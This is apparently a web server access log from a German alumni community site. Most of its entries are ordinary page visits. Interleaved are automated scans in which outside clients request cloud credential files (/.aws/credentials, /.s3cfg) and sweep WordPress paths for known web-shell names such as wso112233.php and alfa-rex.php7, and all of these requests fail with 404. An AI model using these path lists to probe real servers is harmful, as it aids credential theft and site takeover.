af0593c406b467d28ec0412d7d87155abbec51ad9d4ed9fd86953627bff875d6;2025-11-22 18:24:02;;/RDWeb/Pages/;GET;404
628880e67e80af43c28206f28b4189ff54381344148e28895805bdf1c145aa61;2025-11-22 18:26:29;/themen/details/gemeinsam-stark-organisiert;/themen/details/gemeinsam-stark-organisiert;GET;200
857ae32b51ebcdba727e164b79bfeae39bf25e2c5bb3837e5e995f15ab97a10e;2025-11-22 18:29:43;;/personen/alumni/schule/170574;GET;200
decabe539699a8db53c8328437631ec687ff76acf8efcc6e509db19c0f6f3c6a;2025-11-22 18:31:23;/themen/details/wenn-sicherheit-sichtbar-wird;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
0be6d4811eca3f5ee3a9d1d7223cd7fe7174b226fe9d1a62038fd4845a157aaf;2025-11-22 18:32:29;;/personen/alumni/schule/190627;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 18:34:06;/;/;PROPFIND;405
5782cfe9374f2f63411a5937c37949a7799b2b4b1c02d6bd00a4fcff0226a3e2;2025-11-22 18:38:34;/themen/details/uni-zwischen-ebbe-und-flut;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
72daff98a6ab6464b920a45217c0afad1b76605b4a8ca3ce0b6447d5c97437ac;2025-11-22 18:41:11;;/personen/alumni/schule/4240545;GET;200
56a49fa60f9d0e9a4887ded69d6a327a243737c9c6e17f8816a653b999a98fed;2025-11-22 18:49:37;;/personen/alumni/schule/4240628;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-22 19:01:13;/personen/alumni/schule/0351;/personen/alumni/schule/170720;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 19:01:21;/;/;PROPFIND;405
10952a79f14586459f85cc07308af825c4284cb953b7b317fdba0227ac0f1ca5;2025-11-22 19:02:59;;/personen/alumni/schule/5505;GET;200
ef1e19336b3c630f271930d81beef41ef54c01340dd8e0be1b3f3f12e5958b39;2025-11-22 19:05:27;;/personen/alumni/schule/59043;GET;200
d0daffc238918c25964f139056e8d4b808a085ebbe5bf6901d46e998539e5e04;2025-11-22 19:14:42;;/personen/alumni/schule/4440541;GET;200
500ae2f5880a1ea7f13734adc5bfbe543f80ae5e04e4ef0f7e20dda684539686;2025-11-22 19:19:38;;/sitemap_index.xml;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:34;127.0.0.1;/.aws/config;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:35;127.0.0.1;/.aws/config.json;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:36;127.0.0.1;/.aws/credentials;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:37;127.0.0.1;/.msmtprc;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:38;127.0.0.1;/.s3cfg;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:39;127.0.0.1;/.s3cmd.ini;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:40;127.0.0.1;/aws/config;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:42;127.0.0.1;/aws/config.json;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:44;127.0.0.1;/aws/credentials;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:46;127.0.0.1;/aws/credentials.json;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:48;127.0.0.1;/credentials;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:50;127.0.0.1;/cloud/config.json;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:52;127.0.0.1;/config;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:54;127.0.0.1;/%c0;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:56;127.0.0.1;/eb/config.json;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:57;127.0.0.1;/elasticbeanstalk/config.json;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:20:58;127.0.0.1;/list-buckets;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:21:00;127.0.0.1;/s3;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:21:02;127.0.0.1;/s3.config;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:21:04;127.0.0.1;/s3/config.json;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 19:21:06;127.0.0.1;/s3cmd.ini;GET;404
3c9e99393cb928b32711f81e2f04bc81ab32b2c517b3161e4eb8dc50eb774da4;2025-11-22 19:23:00;;/personen/alumni/schule/40745;GET;200
4087716d93fd7d8cdf53d99e20d96a288b4416a2b941430473f0dc2f070b37de;2025-11-22 19:25:12;;/;GET;200
436c14d5c21c229d06944e0f62307e7a3327fe5ce131091d794778f349faa66e;2025-11-22 19:29:58;;/gruppen;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-22 19:30:00;/personen/alumni/schule/0351;/personen/alumni/schule/59000;GET;200
f6512131e2cf8bd5d658004fd8a645c4aca60dd2ff3b22cd9a9a28f09ed9e261;2025-11-22 19:37:05;;/personen/alumni/schule/185826;GET;200
896be1ffb67e4d65cb28b1898cdddb712f7037dae70904ed94d3e50bdabf4411;2025-11-22 19:38:56;;/personen/alumni/schule/5508;GET;200
b13cac3d3581c710359c9c67ba579f9599d0030b28c1c97a061569dd4ad2e420;2025-11-22 19:50:06;;/personen/alumni/schule/9009;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-22 19:51:27;/personen/alumni/schule/0351;/personen/alumni/schule/600027;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-22 19:52:50;/personen/all/5;/personen/all/4;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-22 19:55:36;/personen/alumni/details/dilek-keskin;/personen/alumni/details/dilek-keskin;GET;200
489bee7c4fd529b5488512dc806b8414573e5286a7f017b6b9fda8e47162c8c9;2025-11-22 19:55:52;;/gruppen/interesse/kommunikationsfahigkeiten;GET;200
436c14d5c21c229d06944e0f62307e7a3327fe5ce131091d794778f349faa66e;2025-11-22 19:59:56;;/personen/alumni/schule/SHH001;GET;200
acd4b7c177d81a1c9c9adb1c0bb5d946c719a87b4943109d7a90c48e7da9f6c0;2025-11-22 20:01:33;;/personen;GET;200
9cea0b15b7ddd00ed0fac5b7d2980d4c21d3001722e2feb0c033d566d52ac981;2025-11-22 20:13:21;;/rechtliches/impressum;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-22 20:14:06;/personen/all/5;/personen/all/3;GET;200
e3ef46922bcce813228e918f434398046232377569b2d24a43c2a64549347419;2025-11-22 20:15:24;;/personen/alumni/schule/67210;GET;200
f0c3aafa2979d3e013ac78f451319a4cea70dccda4157b9bd8e88fea676d3e0e;2025-11-22 20:18:54;;/personen/alumni/schule/66345;GET;200
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:25;/;/xmrlpc.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:26;/;/abcd.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:26;/;/admin.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:26;/;/info.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:27;/;/edit.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:28;/;/moon.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:28;/;/wp-content/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:28;/;/classwithtostring.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:29;/;/file4.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:29;/;/ioxi-o.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:30;/;/wp-good.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:31;/;/ds.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:31;/;/bolt.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:31;/;/new.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:32;/;/.well-known/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:32;/;/wp-includes/Requests/Text/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:33;/;/wp-includes/Requests/Text/admin.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:33;/;/.well-known/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:33;/;/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:34;/;/.well-knownold/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:34;/;/.well-known/pkivalidation/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:35;/;/wp-content/plugins/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:35;/;/wp-content/uploads/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:35;/;/wp-content/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:36;/;/wp-includes/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:36;/;/wp-admin/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:36;/;/wp-content/themes/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:37;/;/.well-known/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:37;/;/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:37;/;/.well-knownold/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:38;/;/.well-known/pkivalidation/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:38;/;/wp-content/plugins/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:39;/;/wp-content/uploads/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:39;/;/wp-content/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:40;/;/wp-includes/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:40;/;/wp-admin/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:41;/;/wp-content/themes/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:41;/;/.well-known/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:41;/;/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:41;/;/.well-knownold/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:42;/;/.well-known/pkivalidation/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:43;/;/wp-content/plugins/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:44;/;/wp-content/uploads/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:44;/;/wp-content/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:45;/;/wp-includes/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:45;/;/wp-admin/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:45;/;/wp-content/themes/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:46;/;/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:46;/;/wp-content/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:47;/;/wp-includes/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:47;/;/wp-admin/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:47;/;/alfa-rex.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:48;/;/alfanew.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:48;/;/wp-content/plugins/Cache/Cache.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:48;/;/wp-admin/js/widgets/about.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:49;/;/wp-p.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:49;/;/wp-admin/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:49;/;/wp-includes/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:49;/;/wp-content/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:50;/;/wsoyanz.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:50;/;/yanz.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:50;/;/wp-admin/js/about.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:51;/;/wp-content/plugins/seoo/wsoyanz.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:51;/;/wp-content/plugins/seoo/wsoyanz1.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:52;/;/cache-compat.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:52;/;/ajax-actions.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:52;/;/wp-admin/ajax-actions.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:53;/;/wp-consar.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:53;/;/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:53;/;/admin-post.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:54;/;/wp-admin/maint/maint/ajax-actions.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:54;/;/wp-admin/css/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:55;/;/about.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:55;/;/about.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:55;/;/alfanew.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:56;/;/adminfuns.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:56;/;/ebs.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:57;/;/ws.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:57;/;/alfanew2.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:58;/;/alfa-rex2.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:59;/;/ioxi-rex4.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:26:00;/;/wp-content/plugins/seoo/alfa-ioxi.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:26:00;/;/wp-content/plugins/classic-editor/wp-login.php;GET;404
344b78f04664b06009d09d6b2095627ffca28a2df667a467875a5dd36fd4711b;2025-11-22 20:30:54;;/gruppen/hobby/reisen;GET;302
344b78f04664b06009d09d6b2095627ffca28a2df667a467875a5dd36fd4711b;2025-11-22 20:30:58;/gruppen/hobby/reisen;/gruppen;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-22 20:32:07;/themen/details/was-kommt-nach-dem-abitur;/themen/details/bucher-auf-dem-abstellgleis;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 20:32:56;/;/;PROPFIND;405
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-22 20:33:31;/personen/alumni/schule/0351;/personen/alumni/schule/170690;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-22 20:34:57;/gruppen/hobby/malen-und-zeichnen;/gruppen/hobby/musikproduktion;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-22 20:34:59;/gruppen/hobby/malen-und-zeichnen;/gruppen;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-22 20:36:20;/personen/alumni/schule/0351;/aktuelles/meldungen;GET;200
94d10329701f972a4e9560982dcbf915d8d5021b7b3e7844d5e51d93ed97c11c;2025-11-22 20:39:41;;/personen/alumni/schule/HS002;GET;200
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:12;/;/xmrlpc.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:13;/;/abcd.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:14;/;/admin.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:14;/;/info.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:15;/;/edit.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:15;/;/moon.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:16;/;/wp-content/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:16;/;/classwithtostring.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:16;/;/file4.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:17;/;/ioxi-o.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:17;/;/wp-good.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:18;/;/ds.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:18;/;/bolt.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:18;/;/new.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:19;/;/.well-known/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:19;/;/wp-includes/Requests/Text/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:19;/;/wp-includes/Requests/Text/admin.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:20;/;/.well-known/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:20;/;/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:21;/;/.well-knownold/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:21;/;/.well-known/pkivalidation/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:21;/;/wp-content/plugins/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:22;/;/wp-content/uploads/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:22;/;/wp-content/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:23;/;/wp-includes/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:23;/;/wp-admin/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:23;/;/wp-content/themes/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:24;/;/.well-known/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:24;/;/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:24;/;/.well-knownold/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:25;/;/.well-known/pkivalidation/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:26;/;/wp-content/plugins/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:26;/;/wp-content/uploads/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:26;/;/wp-content/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:27;/;/wp-includes/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:27;/;/wp-admin/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:27;/;/wp-content/themes/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:28;/;/.well-known/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:28;/;/bala.php;GET;404
